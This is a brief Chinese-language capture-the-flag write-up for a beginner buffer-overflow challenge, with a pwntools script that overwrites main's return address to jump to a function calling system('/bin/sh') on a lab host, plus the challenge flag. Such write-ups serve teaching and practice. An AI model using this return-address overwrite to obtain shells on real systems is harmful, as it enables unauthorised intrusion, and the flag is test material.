發現有一個 magic 函式，裡面有`system('/bin/sh')`
利用 BOF 把 main 裡面的 ret 位置 蓋成 magic 的位置即可

```python=
from pwn import *

p = remote('10.140.0.8', 11111)
#p = process('./pwn1')
offset = 'a' * 16
target_addr = 0x04005fb
payload = offset + p64(target_addr)
p.sendline(payload)
p.interactive()
```
- `EOF{B0f_for_Infants}`
